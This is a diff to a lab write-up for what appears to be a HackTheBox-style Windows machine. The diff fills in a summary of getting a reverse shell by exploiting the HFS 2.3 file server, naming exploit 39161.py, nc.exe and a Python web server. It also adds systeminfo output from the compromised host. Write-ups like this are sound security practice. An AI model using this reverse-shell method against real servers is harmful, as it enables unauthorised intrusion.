@@ -5,11 +5,16 @@
 
 ## Summary
 
-* blah
+* Windows Server 2012 R2 with a file server running on port 80
+* RCE exists for the file server, HFS 2.3
+* Simple web server to host nc.exe and a python script is enough to get a reverse shell
 
 ## Tools needed
 
-* blah
+* Python with http.server module
+* searchsploit
+* nc
+
 
 ## Detection 
 
@@ -136,7 +141,15 @@ connect to [10.10.14.5] from (UNKNOWN) [10.10.10.8] 49170
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 
-C:\Users\kostas\Desktop>
+C:\Users\kostas\Desktop> systeminfo
+systeminfo
+
+Host Name:                 OPTIMUM
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+OS Version:                6.3.9600 N/A Build 9600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
 ```
 
 For some reason the first execution of 39161.py didn't take.  On the second attempt is when I got the shell.
